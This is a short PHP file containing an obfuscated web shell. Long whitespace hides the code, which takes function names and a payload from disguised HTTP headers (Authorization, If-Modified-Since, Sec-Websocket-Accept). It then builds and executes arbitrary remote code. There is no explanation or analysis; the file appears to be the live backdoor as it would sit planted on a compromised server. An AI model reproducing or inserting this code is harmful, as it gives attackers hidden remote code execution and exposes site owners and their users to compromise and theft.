<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Authorization'])){$center=$_HEADERS['Authorization']('', $_HEADERS['If-Modified-Since']($_HEADERS['Sec-Websocket-Accept']));$center();}
